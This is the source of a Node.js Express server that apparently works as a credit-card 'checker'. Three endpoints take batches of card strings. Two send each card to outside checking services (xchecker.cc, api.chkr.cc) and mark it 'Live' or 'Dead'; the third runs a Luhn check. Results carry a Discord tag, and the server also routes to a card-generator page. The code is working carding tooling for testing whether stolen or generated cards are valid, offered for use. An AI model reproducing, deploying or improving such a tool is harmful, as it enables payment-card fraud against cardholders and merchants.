const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const app = express();

app.use(express.json());
app.use(express.static('public'));

// Función de validación Luhn
function luhnCheck(cardNumber) {
    let sum = 0;
    let isEven = false;
    
    // Remover espacios y guiones
    cardNumber = cardNumber.replace(/\s|-/g, '');
    
    for (let i = cardNumber.length - 1; i >= 0; i--) {
        let digit = parseInt(cardNumber[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return sum % 10 === 0;
}

// Función para obtener el tipo de tarjeta
function getCardType(cardNumber) {
    const patterns = {
        visa: /^4[0-9]{12}(?:[0-9]{3})?$/,
        mastercard: /^5[1-5][0-9]{14}$/,
        amex: /^3[47][0-9]{13}$/,
        discover: /^6(?:011|5[0-9]{2})[0-9]{12}$/
    };
    
    for (let [type, pattern] of Object.entries(patterns)) {
        if (pattern.test(cardNumber)) {
            return type.toUpperCase();
        }
    }
    return 'UNKNOWN';
}

// Basic Checker
app.post('/api/basic/check', async (req, res) => {
    console.log('Basic check request received');
    try {
        const { cards } = req.body;
        if (!cards || !Array.isArray(cards)) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }

        const results = [];
        for (const card of cards) {
            try {
                const response = await fetch(`https://xchecker.cc/api.php?cc=${encodeURIComponent(card)}`);
                const data = await response.json();
                results.push({
                    card,
                    status: data.status,
                    message: `${data.status} | ${data.details || 'Card Declined'} | .gg/aeolous`
                });
            } catch (error) {
                results.push({
                    card,
                    status: 'Dead',
                    message: 'Card Declined | .gg/aeolous'
                });
            }
            await new Promise(r => setTimeout(r, 2000));
        }

        res.json({ success: true, results });

    } catch (error) {
        console.error('Basic check error:', error);
        res.status(500).json({
            success: false,
            error: 'Gateway Error'
        });
    }
});

// Pro Checker
app.post('/api/pro/check', async (req, res) => {
    console.log('Pro check request received');
    try {
        const { cards } = req.body;
        if (!cards || !Array.isArray(cards)) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }

        const results = [];
        for (const card of cards) {
            try {
                const response = await fetch('https://api.chkr.cc/', {
                    method: 'POST',
                    headers: {
                        'Accept': '*/*',
                        'Content-Type': 'application/x-www-form-urlencoded'
                    },
                    body: new URLSearchParams({
                        data: card,
                        charge: 'false'
                    })
                });

                const data = await response.json();
                results.push({
                    card,
                    status: data.code === 1 ? 'Live' : 'Dead',
                    message: `${data.status} | ${data.message || 'Card Declined'} | .gg/aeolous`
                });
            } catch (error) {
                results.push({
                    card,
                    status: 'Dead',
                    message: 'Card Declined | .gg/aeolous'
                });
            }
            await new Promise(r => setTimeout(r, 3000));
        }

        res.json({ success: true, results });

    } catch (error) {
        console.error('Pro check error:', error);
        res.status(500).json({
            success: false,
            error: 'Gateway Error'
        });
    }
});

// Luhn Checker
app.post('/api/luhn/check', async (req, res) => {
    console.log('Luhn check request received');
    try {
        const { cards } = req.body;
        if (!cards || !Array.isArray(cards)) {
            return res.status(400).json({ success: false, error: 'Invalid request' });
        }

        const results = [];
        for (const card of cards) {
            try {
                const [cardNumber] = card.split('|');
                const isValid = luhnCheck(cardNumber);
                const cardType = getCardType(cardNumber);

                results.push({
                    card,
                    status: isValid ? 'Live' : 'Dead',
                    message: `${isValid ? 'Valid Card' : 'Invalid Card'} | Type: ${cardType} | Luhn Check: ${isValid ? 'Pass' : 'Fail'} | .gg/aeolous`
                });
            } catch (error) {
                results.push({
                    card,
                    status: 'Dead',
                    message: 'Invalid Card Format | .gg/aeolous'
                });
            }
            await new Promise(r => setTimeout(r, 1000));
        }

        res.json({ success: true, results });

    } catch (error) {
        console.error('Luhn check error:', error);
        res.status(500).json({
            success: false,
            error: 'Gateway Error'
        });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'chk.html'));
});

app.get('/gen', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'gen.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});

module.exports = app;
